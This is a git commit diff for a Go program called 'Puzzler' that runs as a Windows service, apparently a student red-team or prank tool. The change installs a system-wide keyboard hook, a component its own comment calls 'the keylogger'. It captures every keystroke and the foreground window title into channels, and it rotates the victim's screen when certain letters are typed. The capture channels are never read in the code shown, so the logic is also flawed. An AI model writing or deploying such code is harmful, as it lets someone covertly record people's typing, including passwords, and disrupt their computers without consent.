e470e73a6a58c00668dfe7d8b8b8de14338cb1f3
Lcdemi <lcd4910@g.rit.edu>
2026-02-12 10:32:21 -0500

    Updated Puzzler to work using Windows Keyboard Hooks

--- Extensions/Puzzler/go.mod
+++ Extensions/Puzzler/go.mod
@@ -3,8 +3,7 @@ module Puzzler
 go 1.25.6
 
 require (
-	github.com/eiannone/keyboard v0.0.0-20220611211555-0d226195f203
 	github.com/kardianos/service v1.2.4
+	github.com/moutend/go-hook v0.1.0
+	golang.org/x/sys v0.34.0
 )
-
-require golang.org/x/sys v0.34.0 // indirect
--- Extensions/Puzzler/puzzler.go
+++ Extensions/Puzzler/puzzler.go
@@ -8,57 +8,141 @@ package main
 import (
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
+	"os/signal"
 
-	"github.com/eiannone/keyboard"
+	"syscall"
+	"unsafe"
+
 	"github.com/kardianos/service"
+	"github.com/moutend/go-hook/pkg/keyboard"
+	"github.com/moutend/go-hook/pkg/types"
+	"golang.org/x/sys/windows"
 )
 
 type program struct{}
 
-var logger service.Logger
+var (
+	logger service.Logger
+	mod    = windows.NewLazyDLL("user32.dll")
+
+	procGetKeyState         = mod.NewProc("GetKeyState")
+	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
+	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
+	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
+	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
+	procGetWindowText       = mod.NewProc("GetWindowTextW")
+	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
+)
 
 func (p *program) Start(s service.Service) error {
 	go p.run()
 	return nil
 }
 func (p *program) run() {
-	listen()
+	key_out := make(chan rune, 1024)
+	window_out := make(chan string, 1024)
+	Run(key_out, window_out)
 }
 func (p *program) Stop(s service.Service) error {
 	return nil
 }
 
-func listen() {
-	if err := keyboard.Open(); err != nil {
-		logger.Error(fmt.Sprintf("Failed to open keyboard: %v", err))
-		return
-	}
-	defer keyboard.Close()
+type (
+	HANDLE uintptr
+	HWND   HANDLE
+)
 
+// Gets length of text of window text by HWND
+func GetWindowTextLength(hwnd HWND) int {
+	ret, _, _ := procGetWindowTextLength.Call(
+		uintptr(hwnd))
+
+	return int(ret)
+}
+
+// Gets text of window text by HWND
+func GetWindowText(hwnd HWND) string {
+	textLen := GetWindowTextLength(hwnd) + 1
+
+	buf := make([]uint16, textLen)
+	procGetWindowText.Call(
+		uintptr(hwnd),
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(textLen))
+
+	return syscall.UTF16ToString(buf)
+}
+
+// Gets current foreground window
+func GetForegroundWindow() uintptr {
+	hwnd, _, _ := procGetForegroundWindow.Call()
+	return hwnd
+}
+
+// Converts from Virtual-Keycode to Ascii rune
+func VKCodeToAscii(k types.KeyboardEvent) rune {
+	var buffer []uint16 = make([]uint16, 256)
+	var keyState []byte = make([]byte, 256)
+
+	n := 10
+	n |= (1 << 2)
+
+	procGetKeyState.Call(uintptr(k.VKCode))
+
+	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
+	r1, _, _ := procGetKeyboardLayout.Call(0)
+
+	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
+		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)
+
+	if len(syscall.UTF16ToString(buffer)) > 0 {
+		return []rune(syscall.UTF16ToString(buffer))[0]
+	}
+	return rune(0)
+}
+
+// Runs the keylogger
+func Run(key_out chan rune, window_out chan string) error {
+	keyboardChan := make(chan types.KeyboardEvent, 1024)
+
+	if err := keyboard.Install(nil, keyboardChan); err != nil {
+		return err
+	}
+
+	defer keyboard.Uninstall()
+
+	signalChan := make(chan os.Signal, 1)
+	signal.Notify(signalChan, os.Interrupt)
+
+	fmt.Println("Starting capturing keyboard input")
 	rotationValue := 0
 
 	for {
-		char, key, err := keyboard.GetKey()
-		if err != nil {
-			logger.Error(fmt.Sprintf("Error reading key: %v", err))
-			continue
-		}
+		select {
+		case <-signalChan:
+			fmt.Println("Received shutdown signal")
+			return nil
+		case k := <-keyboardChan:
+			if hwnd := GetForegroundWindow(); hwnd != 0 {
+				if k.Message == types.WM_KEYDOWN {
+					char := VKCodeToAscii(k)
+					key_out <- char
+					switch char {
+					case 'p', 'P', 'u', 'U', 'z', 'Z', 'l', 'L', 'e', 'E', 'r', 'R':
+						rotationValue += 90
+						fmt.Printf("%c key pressed - executing display.exe to rotate screen %d degrees\n", char, rotationValue%360)
+						logger.Info(fmt.Sprintf("%c key pressed - executing display.exe to rotate screen", char))
 
-		if key == keyboard.KeyEsc {
-			break
-		}
-
-		switch char {
-		case 'p', 'P', 'u', 'U', 'z', 'Z', 'l', 'L', 'e', 'E', 'r', 'R':
-			rotationValue += 90
-			fmt.Printf("%c key pressed - executing display.exe to rotate screen %d degrees\n", char, rotationValue%360)
-			logger.Info(fmt.Sprintf("%c key pressed - executing display.exe to rotate screen", char))
-
-			err := exec.Command("C:\\Windows\\System32\\display.exe", fmt.Sprintf("/rotate:%d", rotationValue%360)).Start()
-			if err != nil {
-				fmt.Println("Error executing display.exe:", err)
-				logger.Error(fmt.Sprintf("Error executing display.exe: %v", err))
+						err := exec.Command("C:\\Windows\\System32\\display.exe", fmt.Sprintf("/rotate:%d", rotationValue%360)).Start()
+						if err != nil {
+							fmt.Println("Error executing display.exe:", err)
+							logger.Error(fmt.Sprintf("Error executing display.exe: %v", err))
+						}
+					}
+					window_out <- GetWindowText(HWND(hwnd))
+				}
 			}
 		}
 	}
